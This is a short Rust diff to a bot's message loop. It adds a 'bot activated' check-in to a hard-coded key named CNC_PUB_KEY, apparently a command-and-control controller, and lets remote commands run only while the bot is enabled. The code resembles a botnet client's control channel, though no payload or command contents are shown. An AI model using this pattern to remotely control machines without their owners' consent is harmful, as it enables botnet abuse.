@@ -56,12 +56,22 @@ impl Bot {
             .update_metadata(self.state.to_string().as_str())
             .await?;
 
+        self.session
+            .send_msg("bot activated", PublicKey::parse(CNC_PUB_KEY).unwrap())
+            .await?;
+
         let pubkey = PublicKey::parse(CNC_PUB_KEY).unwrap();
         let mut stream = self.session.receive_msgs(pubkey).await?;
 
         while let Some(msg) = stream.next().await {
             if let Some(cmd) = Commands::parse(msg.as_str()) {
-                cmd.execute(&mut self.state, &self.session).await?
+                if self.state.enabled {
+                    cmd.execute(&mut self.state, &self.session).await?
+                }
+                // only allow enable commands when the bot is disabled
+                else if let Commands::Enable(_) = cmd {
+                    cmd.execute(&mut self.state, &self.session).await?
+                }
             } else {
                 self.session.send_msg(msg.as_str(), pubkey).await?;
             }
